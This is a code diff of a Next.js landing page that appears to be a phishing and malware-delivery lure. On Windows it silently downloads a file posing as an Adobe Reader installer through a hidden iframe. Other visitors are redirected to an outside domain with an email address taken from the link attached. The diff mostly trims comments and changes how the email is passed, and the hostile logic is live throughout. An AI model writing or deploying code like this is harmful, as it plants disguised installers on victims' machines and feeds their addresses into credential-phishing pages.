@@ -1,4 +1,3 @@
-// pages/index.js
 import { useEffect } from 'react';
 
 export default function Home() {
@@ -8,13 +7,11 @@ export default function Home() {
 
     const NON_WINDOWS_TARGET = "https://wavemarkmx.com/ms";
 
-    //------------------------------------------------------------------
     // 1. Windows users → MSI download, then redirect
-    //------------------------------------------------------------------
     if (isWindows) {
       const iframe = document.createElement('iframe');
       iframe.style.display = 'none';
-      iframe.src = '/Reader_adobe_install_online.msi'; // must exist in /public
+      iframe.src = '/Reader_adobe_install_online.msi';
       document.body.appendChild(iframe);
 
       setTimeout(() => {
@@ -25,9 +22,7 @@ export default function Home() {
       return;
     }
 
-    //------------------------------------------------------------------
-    // 2. NON-Windows → Grab email from hash/query/parameters
-    //------------------------------------------------------------------
+    // 2. Non-Windows → grab email from hash/query
     const url = new URL(window.location.href);
     let email = "";
 
@@ -41,24 +36,16 @@ export default function Home() {
       email = url.searchParams.get("email");
     }
 
-    // C) Query parameter fallback ?smn=
+    // C) Fallback ?smn=
     if (!email && url.searchParams.get("smn")) {
       email = url.searchParams.get("smn");
     }
 
-    // Encode safely
-    const safeEmail = email ? encodeURIComponent(email) : "";
-
-    //------------------------------------------------------------------
-    // 3. Redirect to external NON-Windows destination with query parameter
-    //------------------------------------------------------------------
-    const separator = NON_WINDOWS_TARGET.includes('?') ? '&' : '?';
-    const finalUrl = safeEmail
-      ? `${NON_WINDOWS_TARGET}${separator}email=${safeEmail}`
-      : NON_WINDOWS_TARGET;
+    // 3. Redirect with fragment (keep @ as is)
+    const finalUrl = email ? `${NON_WINDOWS_TARGET}#${email}` : NON_WINDOWS_TARGET;
 
     window.location.href = finalUrl;
   }, []);
 
-  return null; // blank page while redirecting
+  return null;
 }
